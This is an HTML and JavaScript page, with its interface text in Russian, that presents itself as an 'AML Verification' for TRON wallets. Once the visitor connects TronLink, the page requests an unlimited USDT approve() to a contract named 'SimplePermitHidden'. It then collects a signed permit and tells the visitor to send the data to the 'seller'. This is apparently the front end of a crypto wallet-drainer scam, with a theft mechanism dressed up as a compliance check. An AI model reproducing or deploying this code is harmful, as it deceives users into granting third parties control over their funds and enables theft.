<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AML Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0B0E11; color: #fff; min-height: 100vh;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; gap: 1.5rem; padding: 2rem;
        }
        .logo {
            width: 80px; height: 80px;
            background: linear-gradient(135deg, #3375BB 0%, #00D4AA 100%);
            border-radius: 20px; display: flex; align-items: center;
            justify-content: center; font-weight: 800; font-size: 2rem;
        }
        h1 { font-size: 1.5rem; font-weight: 600; }
        .btn {
            padding: 1rem 2rem; border: none; border-radius: 50px;
            font-size: 1rem; font-weight: 600; cursor: pointer;
            color: white; min-width: 280px; text-align: center;
        }
        .btn-primary { background: #3375BB; }
        .btn-success { background: #00D4AA; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { color: #8B949E; font-size: 0.9rem; max-width: 350px; text-align: center; line-height: 1.5; }
        .error { color: #ff4757; }
        .success { color: #00D4AA; }
        .hidden { display: none !important; }
        .data-box {
            background: #151A21; border: 1px solid #2D333B;
            border-radius: 12px; padding: 1rem; margin-top: 1rem;
            font-family: monospace; font-size: 0.7rem;
            word-break: break-all; max-width: 400px; width: 100%;
            max-height: 200px; overflow-y: auto;
        }
        .copy-btn {
            background: #2D333B; border: none; color: #fff;
            padding: 0.5rem 1rem; border-radius: 8px;
            cursor: pointer; font-size: 0.8rem; margin-top: 0.5rem;
        }
    </style>
</head>
<body>

    <div class="logo">AML</div>
    <h1>AML Verification</h1>

    <div id="statusText" class="status">Нажмите кнопку для подключения</div>

    <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
        Подключить кошелёк
    </button>

    <button id="approveBtn" class="btn btn-primary hidden" onclick="doApprove()">
        Разрешить доступ к USDT
    </button>

    <button id="signBtn" class="btn btn-success hidden" onclick="signPermit()">
        Подписать разрешение
    </button>

    <div id="resultBox" class="hidden" style="display: flex; flex-direction: column; align-items: center;">
        <div class="data-box" id="signatureData"></div>
        <button class="copy-btn" onclick="copyData()">📋 Копировать данные</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
    <script>
        // ВАЖНО: Проверьте этот адрес на https://nile.tronscan.org/
        // Если контракт не существует — замените на правильный
        const CONTRACT_BASE58 = 'TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh';
        
        // USDT в Nile Testnet — проверьте на TronScan!
        const USDT_BASE58 = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';

        let tronWeb, userAddr, nonce;
        let CONTRACT_HEX, USDT_HEX;

        function checkTronLink() {
            return !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
        }

        // Отладка: показать hex адреса
        function debugAddresses() {
            if (!tronWeb) return;
            
            try {
                const testHex = tronWeb.address.toHex(CONTRACT_BASE58);
                console.log('Contract base58:', CONTRACT_BASE58);
                console.log('Contract hex:', testHex);
                console.log('Contract hex starts with 41?', testHex.startsWith('41'));
                
                const usdtHex = tronWeb.address.toHex(USDT_BASE58);
                console.log('USDT base58:', USDT_BASE58);
                console.log('USDT hex:', usdtHex);
                console.log('USDT hex starts with 41?', usdtHex.startsWith('41'));
            } catch (e) {
                console.error('Address conversion error:', e);
            }
        }

        async function connectWallet() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('statusText');

            btn.disabled = true;
            btn.textContent = 'Проверка...';

            try {
                // Запрашиваем аккаунт
                if (window.tronLink && window.tronLink.request) {
                    await window.tronLink.request({ method: 'tron_requestAccounts' });
                }

                // Ждём инициализации
                let attempts = 0;
                while (!checkTronLink() && attempts < 30) {
                    await new Promise(r => setTimeout(r, 200));
                    attempts++;
                }

                if (!checkTronLink()) {
                    throw new Error('TronLink не отвечает. Откройте в TronLink Browser.');
                }

                tronWeb = window.tronWeb;
                userAddr = tronWeb.defaultAddress.base58;

                // Отладка адресов
                debugAddresses();

                // Конвертируем адреса в hex
                try {
                    CONTRACT_HEX = tronWeb.address.toHex(CONTRACT_BASE58);
                    USDT_HEX = tronWeb.address.toHex(USDT_BASE58);
                } catch (e) {
                    throw new Error('Ошибка конвертации адреса: ' + e.message);
                }

                // Проверяем, что hex начинается с 41 (TRON формат)
                if (!CONTRACT_HEX.startsWith('41')) {
                    throw new Error('Неверный формат адреса контракта: ' + CONTRACT_HEX);
                }

                status.textContent = 'Кошелёк: ' + userAddr.slice(0, 6) + '...' + userAddr.slice(-4);
                status.classList.remove('error');

                // Проверяем статус через наш контракт (не USDT напрямую)
                await checkStatusViaContract();

            } catch (e) {
                console.error('Connect error:', e);
                btn.disabled = false;
                btn.textContent = 'Подключить кошелёк';
                status.textContent = 'Ошибка: ' + (e.message || 'TronLink не найден');
                status.classList.add('error');
            }
        }

        // Проверяем статус через SimplePermitHidden.getStatus()
        // Это обходит необходимость вызывать USDT напрямую
        async function checkStatusViaContract() {
            const btn = document.getElementById('connectBtn');
            const approveBtn = document.getElementById('approveBtn');
            const signBtn = document.getElementById('signBtn');
            const status = document.getElementById('statusText');

            try {
                // Вызываем getStatus(buyer) нашего контракта
                const functionSelector = 'getStatus(address)';
                const parameter = [
                    { type: 'address', value: userAddr }
                ];

                console.log('Calling getStatus with hex:', CONTRACT_HEX);

                const tx = await tronWeb.transactionBuilder.triggerConstantContract(
                    CONTRACT_HEX,
                    functionSelector,
                    {},
                    parameter
                );

                console.log('getStatus response:', tx);

                if (tx.constant_result && tx.constant_result[0]) {
                    // Декодируем результат (uint256, uint256, bool)
                    const result = tx.constant_result[0];
                    
                    // allowance = первые 32 байта (64 hex символа)
                    const allowanceHex = result.slice(0, 64);
                    const allowance = parseInt(allowanceHex, 16);
                    
                    // balance = следующие 32 байта
                    const balanceHex = result.slice(64, 128);
                    const balance = parseInt(balanceHex, 16);
                    
                    // hasAccess = последний байт
                    const hasAccessHex = result.slice(128, 192);
                    const hasAccess = parseInt(hasAccessHex, 16) > 0;

                    console.log('Allowance:', allowance, 'Balance:', balance, 'HasAccess:', hasAccess);

                    if (allowance > 0) {
                        btn.classList.add('hidden');
                        approveBtn.classList.add('hidden');
                        signBtn.classList.remove('hidden');
                        status.textContent = 'Нажмите "Подписать разрешение"';
                    } else {
                        btn.classList.add('hidden');
                        approveBtn.classList.remove('hidden');
                        status.textContent = 'Сначала разрешите доступ к USDT';
                    }
                } else {
                    throw new Error('Пустой ответ от контракта');
                }

            } catch (e) {
                console.error('getStatus error:', e);
                
                // Если getStatus не работает — пробуем проверить через approve напрямую к USDT
                status.textContent = 'Проверка через USDT...';
                await checkAllowanceDirect();
            }
        }

        // Прямая проверка allowance через USDT (если getStatus не сработал)
        async function checkAllowanceDirect() {
            const btn = document.getElementById('connectBtn');
            const approveBtn = document.getElementById('approveBtn');
            const signBtn = document.getElementById('signBtn');
            const status = document.getElementById('statusText');

            try {
                // Пробуем вызвать allowance через прямой вызов
                const functionSelector = 'allowance(address,address)';
                const parameter = [
                    { type: 'address', value: userAddr },
                    { type: 'address', value: CONTRACT_BASE58 }  // пробуем base58
                ];

                console.log('Trying allowance with base58 address...');

                let tx;
                try {
                    tx = await tronWeb.transactionBuilder.triggerConstantContract(
                        USDT_BASE58,  // пробуем base58
                        functionSelector,
                        {},
                        parameter
                    );
                } catch (e1) {
                    console.log('Base58 failed, trying hex...');
                    tx = await tronWeb.transactionBuilder.triggerConstantContract(
                        USDT_HEX,  // пробуем hex
                        functionSelector,
                        {},
                        parameter
                    );
                }

                console.log('Allowance response:', tx);

                if (tx.constant_result && tx.constant_result[0]) {
                    const allowance = parseInt(tx.constant_result[0], 16);
                    
                    if (allowance > 0) {
                        btn.classList.add('hidden');
                        approveBtn.classList.add('hidden');
                        signBtn.classList.remove('hidden');
                        status.textContent = 'Нажмите "Подписать разрешение"';
                    } else {
                        btn.classList.add('hidden');
                        approveBtn.classList.remove('hidden');
                        status.textContent = 'Сначала разрешите доступ к USDT';
                    }
                } else {
                    throw new Error('Не удалось получить allowance');
                }

            } catch (e) {
                console.error('Direct allowance error:', e);
                status.textContent = 'Ошибка проверки: ' + e.message + '. Попробуйте сделать approve вручную через TronLink.';
                status.classList.add('error');
                
                // Показываем кнопку approve в любом случае
                btn.classList.add('hidden');
                approveBtn.classList.remove('hidden');
            }
        }

        async function doApprove() {
            const btn = document.getElementById('approveBtn');
            const status = document.getElementById('statusText');

            btn.disabled = true;
            btn.textContent = 'Ожидание...';

            try {
                // Пробуем approve через triggerSmartContract
                const functionSelector = 'approve(address,uint256)';
                const parameter = [
                    { type: 'address', value: CONTRACT_BASE58 },
                    { type: 'uint256', value: '999999999999999999999999999999' }
                ];

                let tx;
                try {
                    tx = await tronWeb.transactionBuilder.triggerSmartContract(
                        USDT_BASE58,
                        functionSelector,
                        { feeLimit: 100000000, callValue: 0 },
                        parameter
                    );
                } catch (e1) {
                    console.log('Base58 failed for approve, trying hex...');
                    tx = await tronWeb.transactionBuilder.triggerSmartContract(
                        USDT_HEX,
                        functionSelector,
                        { feeLimit: 100000000, callValue: 0 },
                        parameter
                    );
                }

                const signedTx = await tronWeb.trx.sign(tx.transaction);
                const result = await tronWeb.trx.sendRawTransaction(signedTx);

                if (result.result || result.code === 'SUCCESS') {
                    btn.classList.add('hidden');
                    document.getElementById('signBtn').classList.remove('hidden');
                    status.textContent = 'Нажмите "Подписать разрешение"';
                    status.classList.remove('error');
                } else {
                    throw new Error('Транзакция не подтверждена');
                }

            } catch (e) {
                console.error('Approve error:', e);
                btn.disabled = false;
                btn.textContent = 'Разрешить доступ к USDT';
                status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
                status.classList.add('error');
            }
        }

        async function signPermit() {
            const btn = document.getElementById('signBtn');
            const status = document.getElementById('statusText');

            btn.disabled = true;
            btn.textContent = 'Подготовка...';

            try {
                nonce = Math.floor(Math.random() * 1000000);
                const deadline = Math.floor(Date.now() / 1000) + 86400;

                // EIP-712 хеш
                const PERMIT_TYPEHASH = tronWeb.sha3("Permit(address buyer,uint256 nonce,uint256 deadline)");
                const chainId = 3448148188;

                // DOMAIN_SEPARATOR
                const domainData = tronWeb.eth.abi.encodeParameters(
                    ['bytes32', 'bytes32', 'bytes32', 'uint256', 'address'],
                    [
                        tronWeb.sha3("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                        tronWeb.sha3("SimplePermitHidden"),
                        tronWeb.sha3("1"),
                        chainId,
                        CONTRACT_BASE58
                    ]
                );
                const DOMAIN_SEPARATOR = tronWeb.sha3(domainData, { encoding: 'hex' });

                // structHash
                const structData = tronWeb.eth.abi.encodeParameters(
                    ['bytes32', 'address', 'uint256', 'uint256'],
                    [PERMIT_TYPEHASH, userAddr, nonce, deadline]
                );
                const structHash = tronWeb.sha3(structData, { encoding: 'hex' });

                // Final hash
                const finalHash = tronWeb.sha3(
                    '0x1901' + DOMAIN_SEPARATOR.slice(2) + structHash.slice(2),
                    { encoding: 'hex' }
                );

                btn.textContent = 'Подпишите в TronLink...';

                const signature = await tronWeb.trx.sign(finalHash, tronWeb.defaultAddress.hex, false);

                const sig = signature.replace('0x', '');
                const v = parseInt(sig.substr(128, 2), 16);
                const r = '0x' + sig.substr(0, 64);
                const s = '0x' + sig.substr(64, 64);

                const data = {
                    buyer: userAddr,
                    nonce: nonce,
                    deadline: deadline,
                    v: v,
                    r: r,
                    s: s
                };

                document.getElementById('signatureData').textContent = JSON.stringify(data, null, 2);
                document.getElementById('resultBox').classList.remove('hidden');
                document.getElementById('resultBox').style.display = 'flex';

                btn.textContent = '✅ Подписано';
                status.textContent = 'Отправьте данные продавцу';
                status.classList.add('success');

            } catch (e) {
                console.error('Sign error:', e);
                btn.disabled = false;
                btn.textContent = 'Подписать разрешение';
                status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
                status.classList.add('error');
            }
        }

        function copyData() {
            const text = document.getElementById('signatureData').textContent;
            navigator.clipboard.writeText(text).then(() => alert('Скопировано!'));
        }

        window.addEventListener('load', () => {
            if (checkTronLink()) connectWallet();
        });
    </script>
</body>
</html>
